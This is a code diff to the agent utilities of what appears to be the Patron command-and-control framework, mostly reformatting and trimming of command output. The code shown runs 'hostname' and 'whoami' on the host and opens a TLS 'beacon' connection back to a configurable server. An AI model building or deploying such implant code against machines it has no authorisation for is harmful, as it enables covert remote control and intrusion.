@@ -4,30 +4,30 @@ package client_utils
 
 import (
 	"crypto/tls"
-	"encoding/gob"
 	"crypto/x509"
 	"encoding/base64"
+	"encoding/gob"
 	"fmt"
 	"math/rand"
 	"net"
 	"os/exec"
 	"runtime"
 	"strconv"
+	"strings"
 	"time"
 
 	"github.com/google/uuid"
 
-	"github.com/PatronC2/Patron/types"
-	"github.com/PatronC2/Patron/lib/logger"
 	"github.com/PatronC2/Patron/lib/common"
+	"github.com/PatronC2/Patron/lib/logger"
+	"github.com/PatronC2/Patron/types"
 )
 
-
 func Initialize(logging_enabled string) {
-    set_logging, err := strconv.ParseBool(logging_enabled)
-    if err != nil {
+	set_logging, err := strconv.ParseBool(logging_enabled)
+	if err != nil {
 		fmt.Printf("Failed to parse LoggingEnabled: %v\n", err)
-    }
+	}
 	logger.EnableLogging(set_logging)
 	if err := logger.SetLogFile("app.log"); err != nil {
 		fmt.Printf("Error setting log file: %v\n", err)
@@ -53,13 +53,19 @@ func GenerateAgentMetadata() (string, string, string) {
 	var username string
 
 	if runtime.GOOS == "windows" {
-		hostname = RunShellCommand("hostname")
+		hostname = strings.TrimSpace(RunShellCommand("hostname"))
 	} else {
-		hostname = RunShellCommand("hostname -f")
+		hostname = strings.TrimSpace(RunShellCommand("hostname -f"))
 	}
-	username = RunShellCommand("whoami")
-	if hostname == "" { hostname = "unknown-host" }
-	if username == "" { username = "unknown-user" }
+	username = strings.TrimSpace(RunShellCommand("whoami"))
+
+	if hostname == "" {
+		hostname = "unknown-host"
+	}
+	if username == "" {
+		username = "unknown-user"
+	}
+
 	return agentID, hostname, username
 }
 
@@ -80,21 +86,21 @@ func RunShellCommand(command string) string {
 }
 
 func EstablishConnection(config *tls.Config, ServerIP string, ServerPort string) (*tls.Conn, *gob.Encoder, *gob.Decoder, error) {
-    var address string
-    if net.ParseIP(ServerIP).To4() == nil {
-        address = fmt.Sprintf("[%s]:%s", ServerIP, ServerPort)
-    } else {
-        address = fmt.Sprintf("%s:%s", ServerIP, ServerPort)
-    }
+	var address string
+	if net.ParseIP(ServerIP).To4() == nil {
+		address = fmt.Sprintf("[%s]:%s", ServerIP, ServerPort)
+	} else {
+		address = fmt.Sprintf("%s:%s", ServerIP, ServerPort)
+	}
 
-    logger.Logf(logger.Info, "Dialing %v", address)
+	logger.Logf(logger.Info, "Dialing %v", address)
 
-    beacon, err := tls.Dial("tcp", address, config)
-    if err != nil {
-        logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
-        return nil, nil, nil, err
-    }
-    return beacon, gob.NewEncoder(beacon), gob.NewDecoder(beacon), nil
+	beacon, err := tls.Dial("tcp", address, config)
+	if err != nil {
+		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
+		return nil, nil, nil, err
+	}
+	return beacon, gob.NewEncoder(beacon), gob.NewDecoder(beacon), nil
 }
 
 func GetLocalIP(beacon *tls.Conn) string {
